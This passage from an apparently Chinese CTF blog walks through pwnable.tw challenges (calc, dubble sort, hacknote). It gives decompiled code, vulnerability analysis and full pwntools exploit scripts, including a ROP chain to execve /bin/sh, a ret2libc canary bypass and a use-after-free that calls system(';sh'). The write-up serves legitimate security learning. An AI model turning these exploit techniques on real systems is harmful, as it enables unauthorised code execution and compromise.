)</span><br><span class="line">    &#123;</span><br><span class="line">      a1[*a1 - 1] -= a1[*a1];</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( a2 == &apos;/&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[*a1 - 1] /= a1[*a1];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( a2 == &apos;*&apos; )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[*a1 - 1] *= a1[*a1];</span><br><span class="line">  &#125;</span><br><span class="line">  result = a1; </span><br><span class="line">  --*a1;</span><br><span class="line">  return result;                             // 每一次计算的结果储存在 a1[1]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>  看上去比较杂乱，看了好久也没找到漏洞。。。分析一波大佬们的思路。</p><p>  程序中将a1[0] 存放操作数数目， a1[1,2…]后面存放操作数<br>  用num来表示a1</p><p>  则eval函数的逻辑就是这样：双目运算符，num[0] = 2,所以计算 a+b 逻辑便是：<br>  num[num[0] - 1] = num [2 - 1 ]= num[num[0] - 1] + num[ num[0] ] = num[2-1] + num[2]</p><p>  看样子没什么问题，但是假如直接输入比如说 +100， num[0] = 1 ,num[1] = 100<br>  num[num[0] - 1] = num [1 -1 ] = num[0] = num[num[0] - 1] + num[num[0]] = 1 + 100 = 101</p><p>  可以看出来num[0]的值被改变了，而程序最后输出是输出num[num[0]-1]的值，在这里也就是输出num[101 -1] = num [100]<br>  也就可以泄露栈内存了！！</p><p>  第二步，假如输入 +100+12，计算逻辑便是：<br>  num[num[0] - 1] = num [100] = num[num[0] - 1] + num[num[0]] = num[100] + num[101] = num[350] + 12    //为什么12会在num[101]处</p><p>  总之，这样子便能对任意栈地址写了！！</p><p>  由于每次计算都会对calc的栈区清零（bzero函数），所以我们要写到其他地方栈区，比如说，main函数的返回地址。（直接写以绕过canary）</p><p>  因为输入输出什么的都是数字，所以系统调用最为明智。</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><p>!!!发现了神器!!!很早之前听说过的ropchain，没有在意，没想到，太可怕了！！！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./calc&apos;)</span><br><span class="line">bin = ELF(&apos;./calc&apos;)</span><br><span class="line">sh = remote(&apos;chall.pwnable.tw&apos;, 10100)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">!!!!     ROPgadget --binary ./calc  --ropchain     !!!!直接生成完整的rop链，简直不要太可怕</span><br><span class="line"></span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line"># Padding goes here</span><br><span class="line">p = &apos;&apos;</span><br><span class="line">p+=p32(0x804967a)</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec060) # @ .data</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0805c34b) # pop eax ; ret</span><br><span class="line">p += &apos;/bin&apos;</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec064) # @ .data + 4</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0805c34b) # pop eax ; ret</span><br><span class="line">p += &apos;//sh&apos;</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080550d0) # xor eax, eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080481d1) # pop ebx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec060) # @ .data</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701d1) # pop ecx ; pop ebx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec060) # padding without overwrite ebx</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080550d0) # xor eax, eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x08049a21) # int 0x80</span><br><span class="line"></span><br><span class="line">for i in range(len(p)/4-1):</span><br><span class="line">    sh.sendline(&apos;+&apos;+str(369+i)+&apos;-&apos;+str(u32(p[i*4:i*4+4]))+&apos;+&apos;+str(u32(p[i*4+4:i*4+8])))</span><br><span class="line"></span><br><span class="line">sh.sendline(&apos;&apos;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line">$ whoami</span><br><span class="line">calc</span><br></pre></td></tr></table></figure><p>下面这个是相对正常的exp。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p=remote(&apos;chall.pwnable.tw&apos;,10100)</span><br><span class="line">#p=process(&quot;./calc&quot;)</span><br><span class="line">key=[0x0805c34b,11,0x080701d1,0,0,0x08049a21,0x6e69622f,0x0068732f]</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&apos;+360&apos;)</span><br><span class="line">addr_bp=int(p.recv())</span><br><span class="line">addr_re=((addr_bp+0x100000000)&amp;0xFFFFFFF0)-16</span><br><span class="line">addr_str=addr_re+20-0x100000000</span><br><span class="line">addr=361</span><br><span class="line">for i in range(5):</span><br><span class="line">      p.sendline(&apos;+&apos;+str(addr+i))</span><br><span class="line">      ans=int(p.recv())</span><br><span class="line">      if key[i]&lt;ans:</span><br><span class="line">             ans=ans-key[i]</span><br><span class="line">             p.sendline(&apos;+&apos;+str(addr+i)+&apos;-&apos;+str(ans))</span><br><span class="line">      else:</span><br><span class="line">          ans=key[i]-ans</span><br><span class="line">          p.sendline(&apos;+&apos;+str(addr+i)+&apos;+&apos;+str(ans))</span><br><span class="line">      p.recv()</span><br><span class="line">p.sendline(&apos;+&apos;+&apos;365&apos;+str(addr_str))</span><br><span class="line">p.recv()</span><br><span class="line">for i in range(5,8):</span><br><span class="line">      p.sendline(&apos;+&apos;+str(addr+i))</span><br><span class="line">      ans=int(p.recv())</span><br><span class="line">      if key[i]&lt;ans:</span><br><span class="line">             ans=ans-key[i]</span><br><span class="line">             p.sendline(&apos;+&apos;+str(addr+i)+&apos;-&apos;+str(ans))</span><br><span class="line">      else:</span><br><span class="line">          ans=key[i]-ans</span><br><span class="line">          p.sendline(&apos;+&apos;+str(addr+i)+&apos;+&apos;+str(ans))</span><br><span class="line">      p.recv()</span><br><span class="line">p.send(&apos;kirin&apos;+&apos;\n&apos;)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ whoami</span><br><span class="line">calc</span><br></pre></td></tr></table></figure><h1 id="dubble-sort"><a href="#dubble-sort" class="headerlink" title="dubble sort"></a>dubble sort</h1><p>冒泡排序，小小的漏洞，简直就是课设车祸现场hhh<br>只找到了第一个漏洞，泄露下地址，然后gg</p><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // eax</span><br><span class="line">  int *v4; // edi</span><br><span class="line">  unsigned int v5; // esi</span><br><span class="line">  unsigned int v6; // esi</span><br><span class="line">  int v7; // ST08_4</span><br><span class="line">  int result; // eax</span><br><span class="line">  unsigned int num; // [esp+18h] [ebp-74h]</span><br><span class="line">  int v10; // [esp+1Ch] [ebp-70h]</span><br><span class="line">  char buf; // [esp+3Ch] [ebp-50h]</span><br><span class="line">  unsigned int canary; // [esp+7Ch] [ebp-10h]</span><br><span class="line"></span><br><span class="line">  canary = __readgsdword(0x14u);</span><br><span class="line">  sub_8B5();</span><br><span class="line">  __printf_chk(1, (int)&quot;What your name :&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x40u);                        // 没有截断，泄露libc基地址</span><br><span class="line">  __printf_chk(1, (int)&quot;Hello %s,How many numbers do you what to sort :&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%u&quot;, &amp;num);                    //没有限制输入个数，之后能栈溢出   </span><br><span class="line">  v3 = num;</span><br><span class="line">  if ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = &amp;v10;</span><br><span class="line">    v5 = 0;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(1, (int)&quot;Enter the %d number : &quot;);  </span><br><span class="line">      fflush(stdout);</span><br><span class="line">      __isoc99_scanf(&quot;%u&quot;, v4);</span><br><span class="line">      ++v5;</span><br><span class="line">      v3 = num;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( num &gt; v5 );</span><br><span class="line">  &#125;                                             // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">  dubblesort((unsigned int *)&amp;v10, v3);         // 出人意料的没有漏洞。。。。</span><br><span class="line">                                                // </span><br><span class="line">  puts(&quot;Result :&quot;);                             // print</span><br><span class="line">  if ( num )                                    </span><br><span class="line">  &#123;</span><br><span class="line">    v6 = 0;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = *(&amp;v10 + v6);</span><br><span class="line">      __printf_chk(1, (int)&quot;%u &quot;);</span><br><span class="line">      ++v6;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( num &gt; v6 );</span><br><span class="line">  &#125;                                             // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">  result = 0;</span><br><span class="line">  if ( __readgsdword(0x14u) != canary )</span><br><span class="line">    process_end();</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>刚开始输入name，然后会将其打印出来，因为read没有\x00截断，所以可以泄露出栈内存泄露libc基地址。</p><p>之后在输入个数时scanf不会限制个数，所以之后排完序后会栈溢出，但是因为程序有canary保护，不知道怎么利用。</p><p>大概是因为canary &lt; system_addr &lt; binsh_addr 所以试图让排序后的canary仍然不变，system覆盖返回地址，之后在有个/bin/sh</p><p>整体思路便是ret2libc</p><p>他们不知道怎么发现的如果在排序的时候输入 +  会输出栈的内容且不退出，只知道输入abc这些字符会直接输出栈内容并退出<br>。。。之前输出的数据一直很少，没发现。。</p><p>ps:新的寻找/bin/sh的方法！！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C ./libc_32.so.6|grep  /bin  -A 1</span><br></pre></td></tr></table></figure></p><p><em>而且之前的gdb还是有问题的，attach会直接终结进程，之后会找个法子用ida调试，那样子会舒服不少。</em></p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><p>先把大佬的放上来吧。。之后自己调成功了再放自己的。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">got_off = 0x1b0000</span><br><span class="line">system_off = 0x3a940</span><br><span class="line">bin_sh_off = 0x158e8b</span><br><span class="line"> </span><br><span class="line">p = remote(&quot;chall.pwnable.tw&quot;,10101)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&apos;a&apos;*24)</span><br><span class="line">got_addr = u32(p.recv()[30:34])-0xa</span><br><span class="line">libc_addr = got_addr-got_off</span><br><span class="line">system_addr = libc_addr + system_off</span><br><span class="line">bin_sh_addr = libc_addr + bin_sh_off</span><br><span class="line">p.sendline(&apos;35&apos;)</span><br><span class="line">p.recv()</span><br><span class="line">for i in range(24):</span><br><span class="line">    p.sendline(&apos;0&apos;)</span><br><span class="line">    p.recv()</span><br><span class="line">p.sendline(&apos;+&apos;)</span><br><span class="line">p.recv()</span><br><span class="line">for i in range(9):</span><br><span class="line">    p.sendline(str(system_addr))</span><br><span class="line">    p.recv()</span><br><span class="line">p.sendline(str(bin_sh_addr))</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考：<a href="https://bbs.pediy.com/thread-228226.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-228226.htm</a></p><h1 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h1><p>看着好生熟悉，看了下题目，感觉是之前的UAF的题，回去看了下，果然是hhhhh，不过这次多给了个libc，去掉了之前的之前打印flag的函数、</p><h2 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h2><p>三个功能，添加，打印，删除、</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">unsigned int add()</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v0; // ebx</span><br><span class="line">  signed int i; // [esp+Ch] [ebp-1Ch]</span><br><span class="line">  int size; // [esp+10h] [ebp-18h]</span><br><span class="line">  char buf; // [esp+14h] [ebp-14h]</span><br><span class="line">  unsigned int v5; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(0x14u);</span><br><span class="line">  if ( idx &lt;= 5 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt;= 4; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !ptr[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr[i] = malloc(8u);                    // ptr[i]  *ptr</span><br><span class="line">                                                // </span><br><span class="line">        if ( !ptr[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)ptr[i] = sub_804862B;        // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">        printf(&quot;Note size :&quot;);</span><br><span class="line">        read(0, &amp;buf, 8u);</span><br><span class="line">        size = atoi(&amp;buf);</span><br><span class="line">        v0 = ptr[i];</span><br><span class="line">        v0[1] = malloc(size);</span><br><span class="line">        if ( !*((_DWORD *)ptr[i] + 1) )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;                                       // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">        printf(&quot;Content :&quot;);</span><br><span class="line">        read(0, *((void **)ptr[i] + 1), size);</span><br><span class="line">        puts(&quot;Success !&quot;);</span><br><span class="line">        ++idx;</span><br><span class="line">        return __readgsdword(0x14u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Full&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">unsigned int print()</span><br><span class="line">&#123;</span><br><span class="line">  int idx; // [esp+4h] [ebp-14h]</span><br><span class="line">  char buf; // [esp+8h] [ebp-10h]</span><br><span class="line">  unsigned int v3; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4u);</span><br><span class="line">  idx = atoi(&amp;buf);</span><br><span class="line">  if ( idx &lt; 0 || idx &gt;= ::idx )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( ptr[idx] )</span><br><span class="line">    (*(void (__cdecl **)(void *))ptr[idx])(ptr[idx]);</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned int sub_80487D4()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+4h] [ebp-14h]</span><br><span class="line">  char buf; // [esp+8h] [ebp-10h]</span><br><span class="line">  unsigned int v3; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4u);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;= idx )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    free(*((void **)ptr[v1] + 1));              // ptr[v1] puts指针</span><br><span class="line">                                                // ptr[v1]+1 content指针</span><br><span class="line">    free(ptr[v1]);                              // uaf</span><br><span class="line">    puts(&quot;Success&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h2><p>add 函数会分配大小为8的内存块存放puts与content的指针，因为free之后没有将其指向null，所以可以利用uaf漏洞<br>覆盖note0的指针，将其指向某got地址，print泄露真实地址，计算得到system真实地址<br>再次修改其为system地址，需要使用参数截断—system的参数即为结构体本身<br>这里需要使用system的参数截断，例如  “||sh”或者”;sh”</p><p><em>感觉正在用着残破不堪的工具。。要完了</em></p><h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">      sh.recvuntil(&quot;choice :&quot;)</span><br><span class="line">      sh.sendline(&quot;1&quot;)</span><br><span class="line">      sh.recvuntil(&quot;size :&quot;)</span><br><span class="line"></span><br><span class="line">      sh.sendline(size)</span><br><span class="line">      sh.recvuntil(&quot;Content :&quot;)</span><br><span class="line">      sh.sendline(content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">      sh.recvuntil(&quot;choice :&quot;) </span><br><span class="line">      sh.sendline(&quot;2&quot;) </span><br><span class="line">      sh.recvuntil(&quot;Index :&quot;) </span><br><span class="line">      sh.sendline(index) </span><br><span class="line"></span><br><span class="line">def print(index): </span><br><span class="line">    sh.recvuntil(&quot;choice :&quot;) </span><br><span class="line">    sh.sendline(&quot;3&quot;) </span><br><span class="line">    sh.recvuntil(&quot;Index :&quot;) </span><br><span class="line">    sh.sendline(index)</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./hacknote&apos;)</span><br><span class="line">sh = remote(&quot;chall.pwnable.tw&quot;, 10102)</span><br><span class="line">elf=ELF(&quot;./hacknote&quot;)</span><br><span class="line">libc=ELF(&quot;./libc_32.so.6&quot;)</span><br><span class="line"></span><br><span class="line">read_got=elf.got[&quot;read&quot;]</span><br><span class="line">putnote=0x804862b</span><br><span class="line"></span><br><span class="line">add(&quot;16&quot;,15*&quot;a&quot;)</span><br><span class="line">add(&quot;16&quot;,15*&quot;a&quot;)</span><br><span class="line">delete(&apos;0&apos;)</span><br><span class="line">delete(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">add(&apos;8&apos;,p32(putnote)+p32(read_got))</span><br><span class="line">print(&apos;0&apos;) </span><br><span class="line">read_addr=u32(sh.recv()[:4])</span><br><span class="line">print hex(read_addr)</span><br><span class="line"></span><br><span class="line">sys_addr=read_addr-libc.symbols[&quot;read&quot;]+libc.symbols[&quot;system&quot;] </span><br><span class="line">delete(&apos;2&apos;) </span><br><span class="line">add(&apos;8&apos;,p32(sys_addr)+&quot;;sh\x00&quot;)</span><br><span class="line"></span><br><span class="line">print(&apos;0&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="silver-bullet"><a href="#silver-bullet" class="headerlink" title="silver_bullet"></a>silver_bullet</h1><p><em>风格比较有意思的一个题目</em></p><h2 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h2><p>三个选项:<br>1.create_bullet description最大为0x30，<br>2.power_up 若description小于0x30,最多可以增加至0x30，<br>3.beat 用上面的power beat HP为0x7fffffff的werewolf，打败便退出。</p><p>重点函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 